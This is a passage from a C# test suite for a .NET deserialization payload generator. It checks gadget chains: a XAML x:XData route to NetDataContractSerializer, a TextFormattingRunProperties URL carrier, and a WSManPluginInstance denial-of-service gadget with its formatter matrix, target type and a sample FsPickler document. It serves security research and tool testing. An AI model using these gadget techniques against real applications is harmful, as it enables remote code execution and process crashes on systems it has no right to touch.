                "the x:XData form throws, because the loaded object cannot be a DynamicUpdateMap");
            string withChain = ExceptionChainText(withError);
            AssertTrue(withChain.IndexOf("DynamicUpdateMapExtension.XmlContent", StringComparison.Ordinal) >= 0,
                "and the failure is the writer setting the xml instance, i.e. ReadXml ran: " + withChain);
            AssertTrue(withChain.IndexOf("System.String", StringComparison.Ordinal) >= 0
                    && withChain.IndexOf("DynamicUpdateMap", StringComparison.Ordinal) >= 0,
                "on the object NetDataContractSerializer built from our document: " + withChain);

            // The same document through System.Xaml's XamlServices, on this ordinary MTA thread.
            // That reader is what XamlServices.Load / ActivityXamlServices.Load use, it pulls in
            // no WPF, and reaching the same sink through it is the evidence behind this gadget
            // NOT declaring GadgetRequirement.Wpf.
            Exception systemXamlError = null;
            try { System.Xaml.XamlServices.Parse(withXData); }
            catch (Exception ex) { systemXamlError = ex; }
            AssertTrue(systemXamlError != null,
                "the non-WPF System.Xaml reader also throws on the cast");
            string systemXamlChain = ExceptionChainText(systemXamlError);
            AssertTrue(systemXamlChain.IndexOf("DynamicUpdateMapExtension.XmlContent", StringComparison.Ordinal) >= 0
                    && systemXamlChain.IndexOf("DynamicUpdateMap", StringComparison.Ordinal) >= 0,
                "and it reached ReadXml with no WPF and no STA thread: " + systemXamlChain);

            // THE ONE PLACE THIS CARRIER DOES NOT LAND, measured rather than assumed. The
            // CVE-2020-0605/0606 mitigation (XamlReader's RestrictiveXamlXmlReader, used by the
            // WPF clipboard/XPS sinks) names five blocked types - ObjectDataProvider,
            // ResourceDictionary, AssemblyInstaller, WorkflowDesigner, BindingSource - and it is
            // tempting to conclude that a type absent from that list gets through. It does not:
            // RestrictiveXamlXmlReader.IsRestrictedType is really an ALLOWLIST, keeping only a
            // DependencyObject subclass whose namespace is System.Windows[.*], a primitive, or a
            // registry/SerializationConfig-allowed type, and DROPPING every other subtree. So this
            // gadget is skipped there with NO exception and NO effect. That silence is the point
            // of the assertion: "it did not throw" must never be read as "it worked".
            Exception restrictiveError = null;
            object restrictiveResult = null;
            bool restrictiveAvailable = true;
            RunSTA(delegate
            {
                try { restrictiveResult = SerializersHelper.Xaml_deserialize_restrictive(withXData); }
                catch (NotSupportedException) { restrictiveAvailable = false; }
                catch (Exception ex) { restrictiveError = ex; }
            });
            if (!restrictiveAvailable)
            {
                Console.Error.WriteLine("  [skip] DynamicUpdateMapExtension vs the restrictive "
                    + "XAML reader: this framework predates the CVE-2020-0605/0606 overload");
            }
            else
            {
                AssertTrue(restrictiveError == null,
                    "the restrictive reader does not throw - it drops the subtree: "
                        + ExceptionChainText(restrictiveError));
                AssertTrue(restrictiveResult == null,
                    "and it builds nothing, so ReadXml is never reached and the payload has no "
                        + "effect on a restricted sink (got "
                        + (restrictiveResult == null ? "null" : restrictiveResult.GetType().FullName) + ")");
            }

            Exception withoutError = LoadXamlAndCatch(withoutXData);
            AssertTrue(withoutError != null,
                "nesting the NDCS document directly under the property element does not load");
            string withoutChain = ExceptionChainText(withoutError);
            AssertTrue(withoutChain.IndexOf("DynamicUpdateMapExtension.XmlContent", StringComparison.Ordinal) < 0,
                "and it fails BEFORE ReadXml, in XAML type resolution: " + withoutChain);
            // Printed as well as asserted: this is the exact mistake the technique invites, so
            // the message it produces is worth having in the log.
            Console.Error.WriteLine("  [info] DynamicUpdateMapExtension without x:XData: "
                + Truncate(withoutChain, 200));
        }

        // Load a XAML document on an STA thread and return whatever it threw (null when it
        // loaded). The WPF parser is what every advertised target sink ends up using here.
        private static Exception LoadXamlAndCatch(string xaml)
        {
            Exception caught = null;
            RunSTA(delegate
            {
                try { SerializersHelper.Xaml_deserialize(xaml); }
                catch (Exception ex) { caught = ex; }
            });
            return caught;
        }

        private static string ExceptionChainText(Exception ex)
        {
            var sb = new StringBuilder();
            for (Exception e = ex; e != null; e = e.InnerException)
                sb.Append('[').Append(e.GetType().Name).Append("] ").Append(e.Message).Append(' ');
            return sb.ToString();
        }

        // The metadata an operator searches on.
        private static void DynamicUpdateMapExtensionDeclaresItsFacets()
        {
            var g = GadgetRegistry.CreateGadgetInstance(DumGadget) as GenericGenerator;
            AssertTrue(g != null, "the gadget loads");

            AssertEqual(CommandInputType.ShellCommand, g.CommandInput(),
                "-c is a command, which the INNER NDCS payload consumes");
            AssertEqual(0, g.Variants().Count, "one payload shape");

            List<string> advertised = g.SupportedFormatters();
            AssertEqual(1, advertised.Count,
                "Xaml is the only formatter, because the sink is a XAML parser feature: "
                    + string.Join(", ", advertised.ToArray()));
            AssertEqual(Formatters.Xaml, advertised[0], "and that formatter is Xaml");

            GadgetFacetSet facets = g.Facets();
            AssertTrue(facets.Kinds.Contains(PayloadKind.NestedDeserialization),
                "the XAML document hands its content to a second deserializer");
            AssertTrue(facets.Kinds.Contains(PayloadKind.CodeExecution),
                "and the default inner chain runs a command");
            AssertTrue(facets.Requirements.Contains(GadgetRequirement.BuiltIn),
                "System.Activities ships with the framework");
            AssertTrue(!facets.Requirements.Contains(GadgetRequirement.Wpf),
                "and WPF is NOT required - DynamicUpdateMapExtensionReachesReadXmlOnlyThroughXData "
                    + "reaches the same sink through System.Xaml's XamlServices on an MTA thread");

            AssertTrue(!facets.Versions.Contains(RuntimeVersion.Unspecified),
                "a runtime-gated gadget names at least one working version");
            AssertTrue(facets.Versions.Contains(RuntimeVersion.NetFx481),
                "4.8.1 is the build the effect was observed on");
            AssertTrue(!facets.Versions.Contains(RuntimeVersion.NetFx40),
                "4.0 is excluded: System.Activities.DynamicUpdate arrived in 4.5");

            AssertTrue(g.AdditionalInfo().IndexOf("NetDataContractSerializer", StringComparison.Ordinal) >= 0,
                "AdditionalInfo names the inner serializer");
            AssertTrue(g.AdditionalInfo().IndexOf("XData", StringComparison.Ordinal) >= 0,
                "and the x:XData section the payload depends on");
            AssertInfoPanelKeepsItsFacts(DumGadget);
        }

        // TextFormattingRunProperties' --xamlurl used to steer ObjectDataProvider onto variant
        // 3. It now carries the ResourceDictionary gadget instead, and the SharePoint plugin's
        // --useurl mode rides the same path. The payload the target sees is unchanged, which
        // is the point of the rewire.
        private static void TextFormattingRunPropertiesXamlUrlCarriesResourceDictionary()
        {
            const string url = "http://127.0.0.1:8080/x.xaml";

            InputArgs ia = new InputArgs();
            ia.Cmd = "calc.exe"; // ignored when --xamlurl is given
            ia.Test = false;
            ia.ExtraArguments = new List<string> { "--xamlurl", url };
            RunResult urlForm = PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = "TextFormattingRunProperties",
                FormatterName = "BinaryFormatter",
                OutputFormat = "",
                InputArgs = ia,
            });
            AssertTrue(urlForm.Success, "the URL form generates: " + urlForm.ErrorMessage);

            string carried = Encoding.UTF8.GetString(Bytes(urlForm.Raw));
            AssertTrue(carried.IndexOf("ResourceDictionary", StringComparison.Ordinal) >= 0
                    && carried.IndexOf("Source=\"" + url + "\"", StringComparison.Ordinal) >= 0,
                "and carries the ResourceDictionary document with the URL in Source");
            AssertTrue(carried.IndexOf("ObjectDataProvider", StringComparison.Ordinal) < 0,
                "and nothing of the command chain, because the URL form replaces it");

            // Without the option the gadget is unchanged: still ObjectDataProvider.
            InputArgs plainArgs = new InputArgs();
            plainArgs.Cmd = "calc.exe";
            plainArgs.Test = false;
            RunResult commandForm = PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = "TextFormattingRunProperties",
                FormatterName = "BinaryFormatter",
                OutputFormat = "",
                InputArgs = plainArgs,
            });
            AssertTrue(commandForm.Success, "the command form generates: " + commandForm.ErrorMessage);
            string plain = Encoding.UTF8.GetString(Bytes(commandForm.Raw));
            AssertTrue(plain.IndexOf("ObjectDataProvider", StringComparison.Ordinal) >= 0,
                "and still carries ObjectDataProvider");
        }

        // ---- WSManPluginInstance (denial of service) ----------------------------
        //
        // NOTHING HERE DESERIALIZES THE PAYLOAD, in any tier and in any process. That is the
        // DoS policy (CLAUDE.md, and dev-kitchen's dos-gadget-category-safeguards), and it is
        // not a limitation of these tests: the payload's whole purpose is to terminate the
        // process that reads it, so a suite that read one would be terminating its own runner.
        //
        // What is proven here is everything up to that line: the metadata, that every
        // advertised formatter really names the target type, that the assembly option is taken
        // as typed, that the target type in the GAC still has the shape the technique needs,
        // and that -t ROUTES to the child process for every advertised formatter. The effect
        // itself is static research evidence, recorded in the plan and reproduced by hand with
        //   ysonet.exe -g WSManPluginInstance -f <formatter> --i-understand-dos -t
        // which is the product's own isolated self-test and kills a child, never this process.
        //
        // The generation half of the matrix (every formatter x minify, acknowledged) is
        // covered by DosGadgetsAreContained under --dos / YSONET_DOS_TESTS.

        private const string WsmanGadget = "WSManPluginInstance";

        // Every formatter the gadget advertises. Each one was proven by watching a CHILD
        // ysonet process die with the target's own
        // "InvalidOperationException: Handle is not initialized." - 26 cells (13 formatters x
        // minify) on Windows 11 26200 / .NET Framework 4.8.09221 against Windows PowerShell
        // 5.1's System.Management.Automation 3.0.0.0.
        private static readonly string[] WsmanFormatters =
        {
            "Json.NET", "Xaml", "FastJson", "JavaScriptSerializer", "YamlDotNet",
            "SharpSerializerXml", "SharpSerializerBinary",
            "MessagePackTypeless", "MessagePackTypelessLz4",
            "DataContractSerializer", "DataContractJsonSerializer",
            "NetDataContractSerializer", "XmlSerializer",
        };

        // Generate an ACKNOWLEDGED payload with no self-test. Acknowledged because that is the
        // only way a DoS gadget builds at all; Test stays false because nothing in this suite
        // may deserialize this payload.
        private static RunResult GenerateWsman(string formatter, bool minify, params string[] extraArgs)
        {
            InputArgs ia = new InputArgs();
            ia.Minify = minify;
            ia.DosAcknowledged = true;
            ia.ExtraArguments = new List<string>(extraArgs ?? new string[0]);
            return PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = WsmanGadget,
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            });
        }

        // The target type, if this machine has Windows PowerShell's assembly. Resolved by NAME
        // and never constructed - constructing one is the payload. Null means the capability is
        // absent, which is a named skip and never a pass.
        private static Type WsmanTargetTypeOrNull()
        {
            try { return Type.GetType(WSManPluginInstanceGenerator.TargetClrName
                + ", " + WSManPluginInstanceGenerator.DefaultAssemblyName, false); }
            catch { return null; }
        }

        private static void WSManPluginInstanceDeclaresItsFacets()
        {
            var g = GadgetRegistry.CreateGadgetInstance(WsmanGadget) as GenericGenerator;
            AssertTrue(g != null, "the gadget loads");

            AssertEqual(CommandInputType.Ignored, g.CommandInput(),
                "the payload is a type name, so -c is unused");

            GadgetFacetSet facets = g.Facets();
            AssertTrue(facets.Kinds.Contains(PayloadKind.DenialOfService),
                "the effect is denial of service");
            AssertEqual(1, facets.Kinds.Count,
                "and nothing else: the payload reads nothing, writes nothing and contacts nobody");
            AssertTrue(DosPolicy.IsDosGadget(g),
                "which is what arms every safeguard: the acknowledgement, the bulk exclusion "
                    + "and the test-tier exclusion");

            AssertTrue(facets.Requirements.Contains(GadgetRequirement.ExtraAssembly),
                "the target needs Windows PowerShell's System.Management.Automation, which is "
                    + "common but not guaranteed");
            AssertTrue(facets.Requirements.Contains(GadgetRequirement.NetFramework),
                "the 3.0.0.0 identity is Windows PowerShell, so .NET Framework");

            // DELIBERATELY unspecified, and this assertion is the record of that decision. An
            // unhandled finalizer exception terminates the process on every version this tool
            // targets, so no framework build gates the effect; what gates it is whether the
            // target resolves one ASSEMBLY. Per the RuntimeVersion contract a non-version gate
            // stays unspecified and lives in AdditionalInfo(), so an "unspecified" here is a
            // decision rather than a gap.
            AssertEqual(1, facets.Versions.Count, "one version token");
            AssertTrue(facets.Versions.Contains(RuntimeVersion.Unspecified),
                "the gate is a library, not a runtime build, so no version is claimed");
            AssertTrue(g.AdditionalInfo().IndexOf("System.Management.Automation", StringComparison.Ordinal) >= 0,
                "and AdditionalInfo() names the real gate instead");

            AssertEqual(0, g.Variants().Count, "one payload shape, so no variants");
            AssertTrue(g.Labels().Contains(GadgetTags.Independent),
                "it owns its whole chain");
            AssertTrue(!g.Labels().Contains(GadgetTags.Hosted),
                "it serializes a framework type of its own rather than hosting another gadget");

            // The formatter list, and the four exclusions by name. Naming them is the point: a
            // later edit that quietly advertises one would be claiming a cell that cannot fire.
            List<string> formatters = g.SupportedFormatters();
            AssertEqual(WsmanFormatters.Length, formatters.Count,
                "the advertised formatter count matches what the effect gate proved");
            foreach (string f in WsmanFormatters)
                AssertTrue(g.IsSupported(f), f + " is advertised");
            foreach (string f in new[]
                {
                    Formatters.BinaryFormatter, Formatters.SoapFormatter, Formatters.LosFormatter,
                    Formatters.FsPickler,
                })
                AssertTrue(!g.IsSupported(f), f + " must not be advertised");

            // No token carries a variant annotation, because there are no variants.
            foreach (string token in formatters)
                AssertTrue(token.IndexOf('(') < 0,
                    "\"" + token + "\" carries no variant count, because the gadget has none");
        }

        // Two independent reasons four formatters are impossible, both asserted rather than
        // argued, because "we did not try it" and "it cannot work" look identical in a list.
        private static void WSManPluginInstanceCannotUseTheRuntimeFormatters()
        {
            var g = GadgetRegistry.CreateGadgetInstance(WsmanGadget) as GenericGenerator;

            // 1. The gadget refuses all four rather than emitting a document nothing can read.
            foreach (string f in new[]
                {
                    Formatters.BinaryFormatter, Formatters.SoapFormatter, Formatters.LosFormatter,
                    Formatters.FsPickler,
                })
            {
                RunResult refused = GenerateWsman(f, false);
                AssertTrue(!refused.Success, f + " is refused, not emitted");
            }

            // 2. WHY, for the three runtime formatters: they all read through mscorlib's
            // ObjectReader, which calls CheckSerializable before it creates anything, and the
            // target carries no [Serializable] attribute. Proven on the real type when this
            // machine has it, because the claim is about the shipped assembly and not about a
            // local stand-in.
            Type target = WsmanTargetTypeOrNull();
            if (target == null)
            {
                Console.Error.WriteLine("  [skip] Windows PowerShell's System.Management.Automation "
                    + "3.0.0.0 is not on this machine, so the target's [Serializable] state and "
                    + "type shape were not verified here (capability: wsman-target-assembly)");
            }
            else
            {
                AssertTrue(!target.IsSerializable,
                    "the target is not [Serializable], which is exactly what ObjectReader."
                        + "CheckSerializable rejects: BinaryFormatter, SoapFormatter and "
                        + "LosFormatter can never build it, whatever the document says");
            }

            // 3. And why FsPickler is out for a DIFFERENT reason: it refuses the TYPE during
            // pickler resolution, so no document shape helps. The document below is the shape
            // DataSetXxe's working FsPickler payload uses with the type swapped; it lives here
            // rather than in the gadget because a gadget carries only payloads it ships.
            //
            // Only the INNERMOST exception says anything useful - the outer one is "Error
            // deserializing object of type 'System.Object'", which points nowhere.
            const string fsPicklerAttempt = @"{
  ""FsPickler"": ""4.0.0"",
  ""type"": ""System.Object"",
  ""value"": {
    ""_flags"": ""subtype"",
    ""subtype"": {
      ""Case"": ""NamedType"",
      ""Name"": ""System.Management.Automation.Remoting.WSManPluginManagedEntryInstanceWrapper"",
      ""Assembly"": { ""Name"": ""System.Management.Automation"", ""Version"": ""3.0.0.0"", ""Culture"": ""neutral"", ""PublicKeyToken"": ""31bf3856ad364e35"" }
    },
    ""instance"": {}
  }
}";
            Exception fsp = null;
            try { SerializersHelper.FsPickler_deserialize(fsPicklerAttempt); }
            catch (Exception ex) { fsp = ex; }
            AssertTrue(fsp != null, "FsPickler refuses a document naming the target");
            Exception root = fsp;
            while (root.InnerException != null) root = root.InnerException;
            AssertTrue(root.Message.Contains("not serializable")
                    && root.Message.Contains(WSManPluginInstanceGenerator.TargetClrName),
                "and it refuses the TYPE, not the document: " + root.GetType().Name + ": "
                    + root.Message);
            AssertTrue(!g.IsSupported(Formatters.FsPickler), "so FsPickler stays unadvertised");
        }

        // Every advertised formatter must really name the target type. The payload is inspected
        // as bytes or text and never read back: for a gadget whose only content is a type name,
        // a payload that lost the name is a payload that does nothing, and generation alone
        // cannot tell the difference.
        private static void WSManPluginInstanceCarriesTheTargetTypeInEveryFormatter()
        {
            foreach (string formatter in WsmanFormatters)
            {
                foreach (bool minify in new[] { false, true })
                {
                    string cell = formatter + (minify ? " --minify" : "");
                    RunResult r = GenerateWsman(formatter, minify);
                    AssertTrue(r.Success, cell + " generates: " + r.ErrorMessage);
                    AssertTrue(!RawIsEmpty(r.Raw), cell + " is non-empty");

                    string payloadText = PayloadTextForSearch(r.Raw);

                    if (formatter == "DataContractJsonSerializer")
                    {
                        // The one format that names nothing, by design: the consumer's declared
                        // root type decides what is built, so the whole document is "{}".
                        AssertEqual("{}", payloadText.Trim(),
                            cell + " is the empty object, because that format writes no type name");
                        continue;
                    }

                    if (formatter == "MessagePackTypelessLz4")
                    {
                        // Lz4 is compressed, so the name is not visible in the bytes. Its
                        // uncompressed twin above carries the same swap through the same helper,
                        // and the effect gate fired both.
                        Console.Error.WriteLine("  [info] " + cell + " is compressed, so the type "
                            + "name is asserted on the uncompressed MessagePackTypeless twin");
                        continue;
                    }

                    if (formatter == "Xaml")
                    {
                        // XAML never writes a full CLR name in one piece: the bare type name is
                        // the ELEMENT and the namespace plus assembly live in the xmlns. Same
                        // trap as SoapFormatter, so the two halves are asserted separately
                        // rather than searching for the dotted name.
                        AssertTrue(payloadText.Contains("<WSManPluginManagedEntryInstanceWrapper"),
                            cell + " names the target type as the element");
                        AssertTrue(payloadText.Contains("clr-namespace:"
                                + WSManPluginInstanceGenerator.TargetNamespace),
                            cell + " names the target's CLR namespace in its xmlns");
                    }
                    else
                    {
                        AssertTrue(payloadText.Contains(WSManPluginInstanceGenerator.TargetClrName),
                            cell + " names the target type");
                    }

                    // The two type-swap formats serialize a ysonet surrogate and rewrite the
                    // name afterwards. A silently failed swap still produces a valid payload
                    // that no target can resolve, so the surrogate must be gone.
                    AssertTrue(payloadText.IndexOf("Surrogate", StringComparison.OrdinalIgnoreCase) < 0,
                        cell + " leaks no surrogate type name");
                }
            }
        }

        // The payload as searchable text. LosFormatter is not in this gadget's list, so there is
        // no base64 wrapper to unwrap; what varies is bytes versus a string. Two formats still
        // do not spell the type name in one piece, so the caller handles them: Xaml splits it
        // across the element and its xmlns, and MessagePackTypelessLz4 compresses it away.
        private static string PayloadTextForSearch(object raw)
        {
            byte[] bytes = raw as byte[];
            if (bytes != null)
                return Encoding.UTF8.GetString(bytes);
            return (raw as string) ?? "";
        }

        // The assembly option is taken EXACTLY as typed, because only the target can say whether
        // a name binds (Generators/README.md, "Operator input: document it, do not police it").
        // The TYPE name is the part that never moves.
        private static void WSManPluginInstanceAssemblyOptionIsTakenAsTyped()
        {
            // The default is Windows PowerShell's GAC identity.
            RunResult standard = GenerateWsman("Json.NET", false);
            AssertTrue(standard.Success, "the default generates: " + standard.ErrorMessage);
            AssertTrue(PayloadTextForSearch(standard.Raw)
                    .Contains(WSManPluginInstanceGenerator.DefaultAssemblyName),
                "and it carries the default assembly identity");

            // A deliberately unusual identity: a renamed, differently versioned, unsigned copy
            // is a legitimate research target, and refusing it would only block the experiment.
            const string odd = "Repackaged.Automation, Version=9.9.9.9, Culture=en-GB, PublicKeyToken=null";
            RunResult custom = GenerateWsman("Json.NET", false,
                "--" + WSManPluginInstanceGenerator.AssemblyOptionName, odd);
            AssertTrue(custom.Success, "an unusual identity is accepted: " + custom.ErrorMessage);
            string customText = PayloadTextForSearch(custom.Raw);
            AssertTrue(customText.Contains(odd), "and it reaches the payload verbatim");
            AssertTrue(customText.Contains(WSManPluginInstanceGenerator.TargetClrName),
                "while the TYPE name is unchanged by it - this gadget is one known finalizer, "
                    + "not a generic type-instantiation tool");
            AssertTrue(!customText.Contains(WSManPluginInstanceGenerator.DefaultAssemblyName),
                "and the default identity is gone, so the option really replaced it");

            // The one thing that IS refused, because it cannot be emitted rather than because
            // the tool is judging the value.
            RunResult empty = GenerateWsman("Json.NET", false,
                "--" + WSManPluginInstanceGenerator.AssemblyOptionName, " ");
            AssertTrue(!empty.Success, "an empty assembly name is refused");
            AssertTrue((empty.ErrorMessage ?? "").Contains(WSManPluginInstanceGenerator.AssemblyOptionName),
                "and the refusal names the option: " + empty.ErrorMessage);

            // XAML is the one format that cannot use a display name at all: its xmlns takes a
            // namespace and an assembly NAME. That is a property of the format, and it is
            // asserted so nobody "fixes" it into an unresolvable xmlns.
            RunResult xaml = GenerateWsman("Xaml", false,
                "--" + WSManPluginInstanceGenerator.AssemblyOptionName, odd);
            AssertTrue(xaml.Success, "XAML still generates with a custom identity: " + xaml.ErrorMessage);
            string xamlText = PayloadTextForSearch(xaml.Raw);
            AssertTrue(xamlText.Contains("assembly=" + WSManPluginInstanceGenerator.TargetAssemblySimpleName),
                "and its xmlns carries the assembly's simple name, which is the only form XAML "
                    + "resolves");
            AssertTrue(!xamlText.Contains("Version=9.9.9.9"),
                "so a display name is deliberately not written into the XAML");
        }

        // -t must never deserialize this payload in the ysonet process, for ANY formatter: it
        // would kill the tool the moment the operator asked to see what the payload does. The
        // routing decision is what is asserted here; the run itself is manual, by design.
        private static void WSManPluginInstanceSelfTestIsIsolatedForEveryFormatter()
        {
            InputArgs probe = new InputArgs();
            probe.Test = true;

            foreach (string formatter in WsmanFormatters)
            {
                var g = GadgetRegistry.CreateGadgetInstance(WsmanGadget) as GenericGenerator;
                AssertTrue(g.SelfTestNeedsChildProcess(formatter, probe),
                    formatter + ": -t routes to a child process");
                AssertTrue(g.serializationBinder == null,
                    formatter + ": no custom SerializationBinder, so the isolated route is valid "
                        + "(RunSelfTest refuses that pair)");

                // Nothing is REFUSED, which is the other half of the -t policy: refusing is the
                // last option and it only applies when the child cannot read the format. The
                // child uses the shared reader, so it can read every one of these.
                AssertTrue(PayloadReader.CanRead(formatter),
                    formatter + ": the child process can read this format back, so -t is a real "
                        + "self-test rather than a refusal");
            }

            // And an ordinary gadget is untouched by the new routing.
            AssertTrue(!((GenericGenerator)GadgetRegistry.CreateGadgetInstance("PictureBox"))
                    .SelfTestNeedsChildProcess("Json.NET", probe),
                "a normal gadget still self-tests in-process");
        }

        // The target's shape in the SHIPPED assembly, verified without constructing anything.
        // Every line of the technique depends on one of these, and a future PowerShell that
        // allocated the handle in the constructor, caught the exception in Dispose, or dropped
        // the finalizer would silently make the gadget inert. Reflection only: creating an
        // instance is the payload.
        private static void WSManPluginInstanceTargetShapeIsStillExploitable()
        {
            Type target = WsmanTargetTypeOrNull();
            if (target == null)
            {
                Console.Error.WriteLine("  [skip] Windows PowerShell's System.Management.Automation "
                    + "3.0.0.0 is not on this machine, so the target type shape was not verified "
                    + "(capability: wsman-target-assembly)");
                return;
            }

            AssertTrue(target.IsPublic && target.IsSealed,
                "the target is public and sealed, so a payload can name it directly");
            AssertTrue(!target.IsSerializable,
                "and it is not [Serializable], which is what rules the runtime formatters out");

            System.Reflection.ConstructorInfo ctor = target.GetConstructor(Type.EmptyTypes);
            AssertTrue(ctor != null && ctor.IsPublic,
                "a public parameterless constructor is what every advertised formatter uses to "
                    + "build it");

            System.Reflection.FieldInfo handle = target.GetField("initDelegateHandle",
                System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);
            AssertTrue(handle != null, "the GCHandle field the finalizer frees still exists");
            AssertEqual(typeof(System.Runtime.InteropServices.GCHandle), handle.FieldType,
                "and it is still a GCHandle, whose Free() throws when it was never allocated");

            System.Reflection.MethodInfo finalize = target.GetMethod("Finalize",
                System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);
            AssertTrue(finalize != null && finalize.DeclaringType == target,
                "the target declares its OWN finalizer, which is where Dispose(false) - and so "
                    + "the unallocated Free() - runs");

            // The one method that allocates the handle. A deserializer never calls it, which is
            // the whole reason the finalizer finds a default handle.
            System.Reflection.MethodInfo entry = target.GetMethod("GetEntryDelegate",
                System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.Public);
            AssertTrue(entry != null,
                "GetEntryDelegate is still the only allocator, so an object a deserializer built "
                    + "has never been through it");

            // And the exception that kills the target, established without touching the target:
            // Free() on a default GCHandle. Caught here, so this process is unaffected.
            Exception caught = null;
            try { default(System.Runtime.InteropServices.GCHandle).Free(); }
            catch (Exception ex) { caught = ex; }
            AssertTrue(caught is InvalidOperationException,
                "Free() on an unallocated GCHandle throws InvalidOperationException");
            AssertTrue((caught.Message ?? "").IndexOf("not initialized", StringComparison.OrdinalIgnoreCase) >= 0,
                "with the message the child process reports when the payload fires: "
                    + caught.Message);
        }

        // The first panel row whose text starts with a fact label, or -1.
        private static int IndexOfPanelFact(string[] lines, string label)
        {
            for (int i = 0; i < lines.Length; i++)
                if (lines[i].TrimStart().StartsWith(label, StringComparison.Ordinal))
                    return i;
            return -1;
        }

        // The interactive info panel's contract, asserted for one gadget.
        //
        // The panel renders only BodyRows lines, and one block in it has NO upper bound: the
        // formatter list. WSManPluginInstance advertises 13 formatters, which is 11 of the 15
        // visible rows at this width on its own, so a panel that printed the long list first
        // could not show anything after it however short AdditionalInfo() was. The panel
        // therefore prints the one-line facts a user needs while BROWSING first, and lets the
        // formatter list be the thing that scrolls. Nothing is lost: --list formatters,
        // --fullhelp and the editor's own formatter picker all show the complete set.
        //
        // So the guarantee is: every fact is PRESENT, the short ones are ON SCREEN, and the
        // ordering that makes that true is locked. A gadget whose formatter list scrolls says
        // so instead of quietly passing.
        private static void AssertInfoPanelKeepsItsFacts(string gadget)
        {
            var ed = new ModuleEditor(null, null, true, null, null);
            // A pessimistically NARROW info column: the panel is one of four columns, so a
            // realistic terminal gives it more room than this.
            string[] lines = ed.ModuleInfoLinesForTest(gadget, 34);
            int visible = ModuleEditor.BodyRowsForTest;
            AssertTrue(lines.Length > 0, "the info panel renders for " + gadget);

            int commandAt = IndexOfPanelFact(lines, "Command input:");
            int categoriesAt = IndexOfPanelFact(lines, "Categories");
            int formattersAt = IndexOfPanelFact(lines, "Formatters:");

            AssertTrue(commandAt >= 0, gadget + ": the panel states Command input:");
            AssertTrue(categoriesAt >= 0, gadget + ": the panel states Categories");
            AssertTrue(formattersAt >= 0, gadget + ": the panel states Formatters:");

            AssertTrue(commandAt < visible, gadget + ": Command input: is on screen (row "
                + commandAt + " of " + visible + " visible; shorten AdditionalInfo() and move "
                + "the detail into the option help)");
            AssertTrue(categoriesAt < visible, gadget + ": Categories is on screen (row "
                + categoriesAt + " of " + visible + " visible; shorten AdditionalInfo() and "
                + "move the detail into the option help)");

            AssertTrue(commandAt < formattersAt, gadget + ": Command input: comes before the "
                + "unbounded formatter list, which is what keeps it on screen for a gadget with "
                + "a long list");
            AssertTrue(categoriesAt < formattersAt, gadget + ": and so does Categories");

            if (formattersAt >= visible)
                Console.Error.WriteLine("  [info] " + gadget + ": the formatter list starts at row "
                    + formattersAt + " and scrolls off the " + visible + "-row panel, which is the "
                    + "accepted trade for keeping the short facts visible");
        }

        // AdditionalInfo() is the FIRST block of the interactive info panel and the panel only
        // renders BodyRows lines, so a long one silently pushes the remaining facts off the
        // visible area. This gadget has 13 formatters, the longest list in the catalogue, so it
        // is the one that decides whether the panel's ORDER is right rather than merely whether
        // one gadget's info text is short enough.
        private static void WSManPluginInstanceInfoPanelStillShowsItsFacts()
        {
            AssertInfoPanelKeepsItsFacts(WsmanGadget);
            var ed = new ModuleEditor(null, null, true, null, null);

            // The loud DoS marker must be in the preview, and it must be the thing a user sees
            // before they choose anything.
            AssertTrue(DosPolicy.IsPreviewWarning(DosPolicy.PreviewWarning(WsmanGadget)),
                "the preview warning is recognisable to the renderer, so it is drawn in the error "
                    + "colour");
            AssertTrue(DosPolicy.PreviewWarning(WsmanGadget).Contains(DosPolicy.AckFlagName),
                "and it names the acknowledgement flag");

            List<EditableField> fields = ed.BuildFieldsForTest(WsmanGadget);
            EditableField assembly = FindEditable(fields, WSManPluginInstanceGenerator.AssemblyOptionName);
            AssertTrue(assembly != null && !assembly.Hidden,
                "the editor offers the " + WSManPluginInstanceGenerator.AssemblyOptionName + " setting");
            AssertTrue(!string.IsNullOrEmpty(assembly.Help),
                "and carries its help text, which is where the target requirement is taught");
        }

        // The shared reader is what makes "the child tests exactly what the in-process path
        // would have tested" true by construction. A gadget advertising a format the reader
        // cannot handle has a -t that silently does nothing in-process, or cannot run at all in
        // a child - and for a DoS gadget that is the difference between a self-test and a
        // refusal. So the guard is catalogue-wide rather than about one gadget.
        private static void PayloadReaderCoversEveryAdvertisedFormatter()
        {
            foreach (string gadget in GadgetRegistry.GetGadgetNames())
            {
                IGenerator g = GadgetRegistry.CreateGadgetInstance(gadget);
                if (g == null)
                    continue;
                foreach (string token in g.SupportedFormatters())
                {
                    if (string.IsNullOrWhiteSpace(token))
                        continue;
                    AssertTrue(PayloadReader.CanRead(token),
                        gadget + " advertises \"" + token + "\", which PayloadReader cannot read "
                            + "back, so -t could never test it");
                }
            }

            // The annotated display forms this project uses must all resolve, since that is what
            // SupportedFormatters() actually contains.
            AssertTrue(PayloadReader.CanRead("YamlDotNet < 5.0.0"), "a version-annotated token resolves");
            AssertTrue(PayloadReader.CanRead("BinaryFormatter (2)"), "a variant-annotated token resolves");

            // And an unknown format fails LOUDLY, with the one shared wording, rather than
            // quietly doing nothing.
            Exception caught = null;
            try { PayloadReader.Read("{}", "NoSuchFormatter", null); }
            catch (Exception ex) { caught = ex; }
            AssertTrue(caught != null, "an unknown format throws");
            AssertEqual(PayloadReader.NoReaderMessage("NoSuchFormatter"), caught.Message,
                "with the shared message, so a caller and a test cannot spell it differently");
            AssertTrue(!PayloadReader.CanRead("NoSuchFormatter"), "and CanRead agrees");
        }

        // ---- DataViewManagerXxe ------------------------------------------------

        private static readonly string[] DvmXxeFormatters =
        {
            "Xaml", "JavaScriptSerializer", "FastJson", "SharpSerializerXml", "SharpSerializerBinary"
        };

        private const string DvmXxeUrl = "http://127.0.0.1:1/ysonet-test.dtd";

        // Both XXE gadgets validate through the same shared helper, so the checks below drive
        // it once instead of duplicating a per-gadget copy. The module name and example are
        // only refusal wording.
        private static string ValidateDtdUrl(string url)
        {
            return DtdSystemLiteral.ValidateHttpUrl(url, "DataViewManagerXxe",
                DataViewManagerXxeGenerator.ExampleUrl);
        }

